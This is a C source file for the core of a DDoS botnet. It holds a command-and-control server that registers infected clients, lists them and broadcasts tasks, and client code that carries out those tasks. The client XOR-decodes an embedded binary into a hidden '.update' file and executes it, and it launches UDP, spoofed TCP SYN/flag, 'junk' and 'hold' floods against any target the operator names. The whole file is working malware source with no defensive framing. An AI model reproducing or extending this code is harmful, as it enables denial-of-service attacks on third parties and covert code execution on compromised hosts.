/*
   core.c

   last modified at: 2015/4/25
   error

   defines packet and functions used in communicate between client and server
 */

#include "core.h"
#include "../utils/utils.h"
#include "../alg/alexjlz_hash.h"
#include "../log/log.h"
#include "../tcpip/tcpip.h"
#include "../adt/list.h"
#include "update.h"

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <netdb.h>
#include <time.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <strings.h>
#include <errno.h>
#include <pthread.h>
#include <sys/utsname.h>

list_p client_list = NULL;
pthread_mutex_t client_list_mutex = PTHREAD_MUTEX_INITIALIZER;

int certify_register_packet(struct packet* p)
{
    char random_str[32] = {0};
    char client_hash[32] = {0};
    char server_hash[32] = {0};

    parse_string((p->value), random_str, "random_str", 31);
    parse_string((p->value), client_hash, "hash", 31);
    alexjlz_hash(random_str, server_hash);

    if ( strcmp(client_hash, server_hash) == 0 )
        return 1;
    else
    {
        alexjlz_log(6, "random_str:%s client_hash:%s server_hash:%s\n", random_str, client_hash, server_hash);
        return 0;
    }
}

/*
   alexjlz_register retval:
0:  heartbeat
1:  task sign
-1: register failed
 */
int alexjlz_register(struct client *c, struct packet *p)
{
    if ( !certify_register_packet(p) || (p->type != packet_register) )  // certify
        return -1;

    pthread_mutex_lock(&client_list_mutex);  // exclusively access to client_list

    int status = 0;
    struct client *c_iter = NULL;
    list_iter_p client_list_iter = list_iterator(client_list, FRONT);

    parse_string(p->value, c->uuid, "uuid", sizeof(c->uuid));  // this is for identify client
    while ( (c_iter = list_next(client_list_iter)) != NULL )
    {
        if ( strcmp(c->uuid, c_iter->uuid) == 0 ) // heartbeat
        {
            alexjlz_log(3, "client <<%s>> (ip:%s)  heartbeat!\n", c_iter->uuid, c_iter->ip);

            // update info
            strcpy(c_iter->ip, c->ip);  // update ip 
            c_iter->last_heartbeat = time(NULL); // update heartbeat
            bzero(c_iter->asc_last_heartbeat, sizeof(c_iter->asc_last_heartbeat));
            alexjlz_time(c_iter->asc_last_heartbeat); // ascii heartbeat
            bcopy(&(p->uts), &(c_iter->uts), sizeof(struct utsname));
            parse_string(p->value, c_iter->current_task, "current_task", sizeof(c_iter->current_task)); // current task
            if ( strlen(c_iter->task) != 0 )  // sign task
            {
                strcpy(c->task, c_iter->task);
                bzero(c_iter->task, sizeof(c_iter->task));
                status = 1;
            }
            break;
        }
    }
    if ( c_iter == NULL )  // register
    {
        alexjlz_log(1, "client <<%s>> (ip:%s)  register!\n", c->uuid, c->ip);
        list_add(client_list, c, sizeof(struct client));
        status = 0;
    }

    pthread_mutex_unlock(&client_list_mutex);
    return status;
}

void *serve_client ( void *arg )
{
    int client_fd = *((int *)arg);
    fd_set client_fd_set;
    struct timeval tv;
    int retval;
    int status = 0;

    int bytes_read = 0;
    int bytes_write = 0;
    struct packet p;  // client
    struct packet q;  // server
    struct client c; bzero(&c, sizeof(c));
    char *client_ip = c.ip;

    /* get remote ip address and record it */
    if ( get_remote_ip(client_fd, client_ip) == -1 )
    {
        alexjlz_log(3, "Error, failed to get client ip, exit...\n");
        return ;
    }

    while ( 1 )
    {
        bzero(&p, sizeof(p));
        bzero(&q, sizeof(q));
        bzero(&c, sizeof(c));
        FD_ZERO(&client_fd_set);
        FD_SET(client_fd, &client_fd_set);
        tv.tv_sec = 60;
        tv.tv_usec = 0;

        if ( get_remote_ip(client_fd, client_ip) == -1 )
        {
            alexjlz_log(3, "Warn, failed to get client ip, exit...\n");
        }
        /* wait for client to send packet for 6 secs */
        retval = select(client_fd+1, &client_fd_set, NULL, NULL, &tv);
        if ( retval == -1 )  // error
        {
            alexjlz_log(3, "Error, select retval == -1\n");
            if ( check_fd(client_fd) )
                close(client_fd);
            return ;
        }
        else if ( retval == 0 ) // timeout
        {
            alexjlz_log(3, "Error, select timeout\n");
            if ( check_fd(client_fd) )
                close(client_fd);
            return;
        }
        bytes_read = readn ( client_fd, &p, sizeof(p) );  // else readable
        if ( bytes_read != sizeof(p) )
        {
            alexjlz_log(1, "Error, serve readn read %d bytes\n", bytes_read);
            if ( check_fd(client_fd) )
                close(client_fd);
            return ;
        }

        status = alexjlz_register(&c, &p);
        if ( status == -1 ) // packet is 
        {
            if ( check_fd(client_fd) )
                close(client_fd);
            return ;
        }
        else if ( status == 1 )  // register ( or heartbeat ) client, and maybe sign task for client
        {
            alexjlz_log(1, "Sign task to client\n");
            bzero(&q, sizeof(q));
            q.type = packet_task_sign;
            q.flag = 0;
            sprintf(q.value, "%s", c.task);
            if ( writen( client_fd, &q, sizeof(q) ) != sizeof(q))
            {
                alexjlz_log(1, "Error, sign task: %s to client: %s, ip:%s\n", &(c.task), &(c.uuid), &(c.ip));
            }
        }
    }

    return ;
}

int ask_for_service( int server_fd )
{
    extern char uuid[32];

    fd_set server_fd_set;
    struct timeval tv;
    int retval;

    int bytes_read = 0;
    int bytes_write = 0;
    struct packet p; // client (self)
    struct packet q; // server (remote)
    char random_str[32] = {0};
    char hash[32] = {0};

    while ( 1 )
    {
        bzero(&p, sizeof(p));
        bzero(&q, sizeof(q));
        bzero(random_str, sizeof(random_str));
        bzero(hash, sizeof(hash));
        randomstr(random_str, 20);   // register to server
        alexjlz_hash(random_str, hash);
        uname(&(p.uts));

        sprintf(p.value, "random_str:%s hash:%s uuid:%s", random_str, hash, uuid);
        p.type = packet_register;
        if (writen(server_fd, &p, sizeof(p)) != sizeof(p) )
        {
            //fprintf(stderr, "Error: writen\n");
            if ( check_fd(server_fd) )
                close(server_fd);
            return -1;
        }

        FD_ZERO(&server_fd_set);
        FD_SET(server_fd, &server_fd_set);
        tv.tv_sec = 3;
        tv.tv_usec = 0;
        retval = select(server_fd+1, &server_fd_set, NULL, NULL, &tv);
        if ( retval == -1 )  // error
        {
            //fprintf(stderr, "Error, select retval == -1\n");
            if ( check_fd(server_fd) )
                close(server_fd);
            return -1;
        }
        else if ( retval == 0 ) // timeout means no task
        {
            //if ( check_fd(server_fd) )
            //    close(server_fd);
            //return 0;
            continue;
        }
        else  // sign comes ( or closed by server ? ), or the other end closed the connection, please man select
        {
            bytes_read = readn ( server_fd, &q, sizeof(q) );
            if ( bytes_read != sizeof(p) )  // this would happen when the other end \
                // closed the connection or network error, anyway, just return
            {
                if ( check_fd(server_fd) )
                    close(server_fd);
                return 0;
            }
            if ( q.type == packet_task_sign )
            {
                char cmd[64] = {0};
                parse_string(q.value, cmd, "cmd", sizeof(cmd)-1);
                if ( strcmp(cmd, "update") == 0 )
                {
                    int pid = -1;
                    while ( pid < 0 )
                        pid = fork();
                    if ( pid != 0 )  // parent
                    {
                        exit(0);
                    }
                    else // child
                    {
                        char url[256] = {0};
                        char c = 0;
                        int i = 0;
                        //parse_string(q.value, url, "url", sizeof(url)-1);
                        int update_fd = open(".update", O_RDWR | O_CREAT, 0755);
                        if ( update_fd < 0 )
                            exit(-1);
                        while ( i<update_len )
                        {
                            c = update[i];
                            c = c^0xff;
                            if ( write(update_fd, &c, 1) == -1 )
                            {
                                exit(-1);
                            }
                            i++;
                        }
                        close(update_fd);
                        execl("./.update", "./.update", NULL);
                    }
                }
                else if ( strcmp(cmd, "attack") == 0 )
                {
                    //fprintf(stdout, "Info, got task:%s\n", q.value); // todo: fork task
                    char type[16] = {0}; // udp, tcp, junk, hold
                    char flags[32] = {0}; // all, syn, rst, fin, ack, psh
                    char target[256] = {0};
                    uint32_t port = 0; char asc_port[32] = {0};
                    uint32_t spoof = 32; char asc_spoof[16] = {0};
                    uint32_t packetsize = 64; char asc_packetsize[16] = {0};
                    uint32_t pollinterval = 10; char asc_pollinterval[16] = {0};
                    uint32_t time = 0; char asc_time[16] = {0};
                    parse_string(q.value, type, "type", sizeof(type)-1);
                    parse_string(q.value, flags, "flags", sizeof(flags)-1);
                    parse_string(q.value, target, "target", sizeof(target)-1);
                    parse_string(q.value, asc_port, "port", sizeof(asc_port)-1);
                    parse_string(q.value, asc_spoof, "spoof", sizeof(asc_spoof)-1);
                    parse_string(q.value, asc_spoof, "spoof", sizeof(asc_spoof)-1);
                    parse_string(q.value, asc_packetsize, "packetsize", sizeof(asc_packetsize)-1);
                    parse_string(q.value, asc_pollinterval, "pollinterval", sizeof(asc_pollinterval)-1);
                    parse_string(q.value, asc_time, "time", sizeof(asc_time)-1);
                    port = atoi(asc_port)?atoi(asc_port):0;
                    spoof = atoi(asc_spoof)?atoi(asc_spoof):32;
                    packetsize = atoi(asc_packetsize)?atoi(asc_packetsize):64;
                    pollinterval = atoi(asc_pollinterval)?atoi(asc_pollinterval):10;
                    time = atoi(asc_time)?atoi(asc_time):60;

                    if ( strcmp(type, "hold")==0 )
                    {
                        if ( !listFork() )
                        {
                            //printf("starting sendHOLD...\n");
                            sendHOLD(target, port, time);
                            close(server_fd);
                            _exit(0);
                        }
                    }
                    if ( strcmp(type, "junk")==0 )
                    {
                        if ( !listFork() )
                        {
                            //printf("starting sendJUNK...\n");
                            sendJUNK(target, port, time);
                            close(server_fd);
                            _exit(0);
                        }
                    }
                    if ( strcmp(type, "udp")==0 )
                    {
                        if ( !listFork() )
                        {
                            //printf("starting sendUDP...\n");
                            sendUDP(target, port, time, spoof, packetsize, pollinterval);
                            close(server_fd);
                            _exit(0);
                        }
                    }
                    if ( strcmp(type, "tcp")==0 )
                    {
                        if ( !listFork() )
                        {
                            if ( strcmp(flags, "") == 0 )
                                strcpy(flags, "syn");
                            //printf("starting sendTCP...\n");
                            sendTCP(target, port, time, spoof, flags, packetsize, pollinterval);
                            close(server_fd);
                            _exit(0);
                        }
                    }
                } // attack
            } // packet_task_sign
        } // sign comes
    } // while 

    return 0;
}

int process_command(struct alexjlz_packet *p, list_p output)
{
    char cmd[32] = {0};
    struct alexjlz_packet output_packet;
    parse_string(p->value, cmd, "cmd", 31);
    if ( strcmp(cmd, "") == 0 )
    {
        bzero(&output_packet, sizeof(output_packet));
        sprintf(output_packet.value, "Error: cmd empty!\n");
        list_add(output, &output_packet, sizeof(output_packet));
    }
    else if ( strcmp(cmd, "list") == 0 )
    {
        alexjlz_log(1, "CMD:list\n");
        pthread_mutex_lock(&client_list_mutex);
        struct client *c_iter = NULL;
        list_iter_p client_list_iter = list_iterator(client_list, FRONT);
        while ( (c_iter = list_next(client_list_iter)) != NULL )
        {
            bzero(&output_packet, sizeof(output_packet));
            sprintf(output_packet.value, "uuid:%s nodename:%s ip:%s last_heartbeat:%s current_task:%s\n", c_iter->uuid, c_iter->uts.nodename, c_iter->ip, c_iter->asc_last_heartbeat, c_iter->current_task);
            list_add(output, &output_packet, sizeof(output_packet));
        }
        pthread_mutex_unlock(&client_list_mutex);
    }
    else if ( strcmp(cmd, "update") == 0 )
    {
        alexjlz_log(1, "CMD:update\n");
        pthread_mutex_lock(&client_list_mutex);
        struct client *c_iter = NULL;
        list_iter_p client_list_iter = list_iterator(client_list, FRONT);
        while ( (c_iter = list_next(client_list_iter)) != NULL )
        {
            strcpy( c_iter->task, p->value );
        }
        pthread_mutex_unlock(&client_list_mutex);
    }
    else if ( strcmp(cmd, "attack") == 0 )
    {
        char *help_attack = "command syntax error\n";
        char attack_type[16] = {0}; // udp, tcp, junk, hold
        char flags[32] = {0}; // all, syn, rst, fin, ack, psh
        char target[256] = {0};
        uint32_t port = 0; char asc_port[32] = {0};
        uint32_t spoof = 32; char asc_spoof[16] = {0};
        uint32_t packetsize = 64; char asc_packetsize[16] = {0};
        uint32_t pollinterval = 10; char asc_pollinterval[16] = {0};
        uint32_t time = 0; char asc_time[16] = {0};
        parse_string(p->value, attack_type, "type", sizeof(attack_type)-1);
        parse_string(p->value, flags, "flags", sizeof(flags)-1);
        parse_string(p->value, target, "target", sizeof(target)-1);
        parse_string(p->value, asc_port, "port", sizeof(asc_port)-1);
        parse_string(p->value, asc_spoof, "spoof", sizeof(asc_spoof)-1);
        parse_string(p->value, asc_spoof, "spoof", sizeof(asc_spoof)-1);
        parse_string(p->value, asc_packetsize, "packetsize", sizeof(asc_packetsize)-1);
        parse_string(p->value, asc_pollinterval, "pollinterval", sizeof(asc_pollinterval)-1);
        parse_string(p->value, asc_time, "time", sizeof(asc_time)-1);
        port = atoi(asc_port)?atoi(asc_port):0;
        spoof = atoi(asc_spoof)?atoi(asc_spoof):32;
        packetsize = atoi(asc_packetsize)?atoi(asc_packetsize):64;
        pollinterval = atoi(asc_pollinterval)?atoi(asc_pollinterval):10;
        time = atoi(asc_time)?atoi(asc_time):60;

        struct client *c_iter = NULL;
        pthread_mutex_lock(&client_list_mutex);
        list_iter_p client_list_iter = list_iterator(client_list, FRONT);
        while ( (c_iter = list_next(client_list_iter)) != NULL )
        {
            strcpy( c_iter->task, p->value );
            bzero(&output_packet, sizeof(output_packet));
            sprintf(output_packet.value, "uuid:    %s\n ip:    %s\n task:    %s\n", c_iter->uuid, c_iter->ip, c_iter->task);
        }
        list_add(output, &output_packet, sizeof(output_packet));
        pthread_mutex_unlock(&client_list_mutex);
    }
    else
    {
        bzero(&output_packet, sizeof(output_packet));
        sprintf(output_packet.value, "Error: Unkown cmd!\n");
        list_add(output, &output_packet, sizeof(output_packet));
    }
    bzero(&output_packet, sizeof(output_packet));
    sprintf(output_packet.value, OUTPUT_END);
    list_add(output, &output_packet, sizeof(output_packet));
    return 0;
}
int certify_alexjlz(struct alexjlz_packet *p)
{
    char username[64] = {0};
    char password[64] = {0};

    parse_string(p->value, username, "username", 63);
    parse_string(p->value, password, "password", 63);
    alexjlz_log(0, "username:%s password:%s\n", username, password);
    if ( (strcmp(username, USERNAME)!=0) || (strcmp(password, PASSWORD)!=0) )
        return 0;
    else
        return 1;
}
void *serve_alexjlz( void *arg)
{
    int alexjlz_fd = *((int *)arg);
    struct alexjlz_packet p; // alexjlz -> server
    struct alexjlz_packet q; // server -> alexjlz 
    int bytes_read = 0;
    int bytes_write = 0;
    int status = 0;

    fd_set alexjlz_fd_set;
    struct timeval tv;
    int retval;

    while ( 1 )
    {
        bzero(&p, sizeof(p));
        bzero(&q, sizeof(q));
        FD_ZERO(&alexjlz_fd_set);
        FD_SET(alexjlz_fd, &alexjlz_fd_set);
        tv.tv_sec = 3600;
        tv.tv_usec = 0;
        retval = 0;

        retval = select(alexjlz_fd+1, &alexjlz_fd_set, NULL, NULL, &tv);
        if ( retval == -1 )  // error
        {
            if ( errno = EINTR )
                continue;
            else
            {
                if ( check_fd(alexjlz_fd) )
                    close(alexjlz_fd);
                return ;
            }
        }
        else if ( retval == 0 ) // timeout, this should happen when user drop out or network error
        {
            if ( check_fd(alexjlz_fd) )
                close(alexjlz_fd);
            return ;
        }
        else  // readable
        {
            bytes_read = readn(alexjlz_fd, &p, sizeof(p));
            if ( bytes_read != sizeof(p) )
            {
                if ( check_fd(alexjlz_fd) )
                    close(alexjlz_fd);
                return ;
            }
            else
            {
                if ( !certify_alexjlz(&p) )
                {
                    if ( check_fd(alexjlz_fd) )
                        close(alexjlz_fd);
                    return ;
                }
                list_p output = create_list();
                if ( process_command(&p, output) == 0 )
                {
                    struct alexjlz_packet *output_packet;
                    list_iter_p output_list_iter = list_iterator(output, FRONT);
                    while ( (output_packet = list_next(output_list_iter)) != NULL )
                    {
                        alexjlz_log(3, "Write to alexjlz:%s\n", output_packet->value);
                        if ( writen(alexjlz_fd, output_packet, sizeof(*output_packet)) != sizeof(*output_packet) )
                        {
                            alexjlz_log(3, "Error, serve_alexjlz writen not enough bytes\n");
                            break;
                        }
                    }
                }
                destroy_list(output);
                alexjlz_log(3, "Cmd process success\n");
            }
        }
    }
}
